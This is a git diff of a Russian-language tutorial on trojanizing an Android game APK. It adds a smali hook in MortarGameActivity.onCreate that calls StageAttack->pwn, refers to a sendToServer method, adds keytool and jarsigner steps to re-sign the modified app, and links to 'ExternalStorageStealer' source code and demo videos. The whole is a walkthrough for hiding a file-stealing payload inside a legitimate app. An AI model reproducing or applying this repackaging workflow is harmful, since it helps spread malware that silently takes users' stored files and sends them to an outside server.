@@ -371,7 +371,7 @@ private void sendToServer(String path) {
 
 Выяснили, что MortarGameLauncherActivity запускает MortarGameActivity и закрывается. Открываем MortarGameActivity. Комментировать полностью его не будем. Нам интересно то, что происходит в методе ```Oncreate```, так как с него начинается создание активити. Сразу после него будем вставлять наш код. Важно не нарушить порядок line, при вставке.
 
-```smali
+```java
 .method protected onCreate(Landroid/os/Bundle;)V
     .locals 9
 
@@ -419,6 +419,7 @@ invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Con
 И вставляем в MortarGameActivity. В итоге метод onCreate() выглядит:
 
 ```java
+...
 .method protected onCreate(Landroid/os/Bundle;)V
     .locals 9
 
@@ -461,5 +462,13 @@ invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Con
 keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
 ```
 
+Подписываем apk:
+```
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
+```
 
-[Здесь исходники](https://github.com/OrderOfSixAngles/ExternalStorageStealer)
+Теперь все готово. [Исходники тут](https://github.com/OrderOfSixAngles/ExternalStorageStealer). Видеодемонстрация, как все работает тут:
+https://youtu.be/e5w5taMY8MA
+https://youtu.be/iBCX_A5FBVU
+
+
